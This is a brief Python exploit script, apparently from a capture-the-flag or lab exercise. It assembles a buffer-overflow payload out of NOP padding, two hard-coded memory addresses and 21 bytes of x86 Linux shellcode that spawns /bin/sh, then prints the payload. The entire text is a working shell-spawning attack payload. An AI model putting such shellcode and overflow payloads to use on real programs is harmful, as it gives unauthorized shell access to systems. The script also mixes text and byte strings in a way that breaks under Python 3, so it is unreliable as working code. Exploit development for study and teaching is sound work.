import struct

exploit=""
exploit+="\x90"*16
exploit+=struct.pack("I", 0x804a020)
exploit+=b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
exploit+="\x90"*67
exploit+=struct.pack("I", 0x804a01c)

print(exploit)
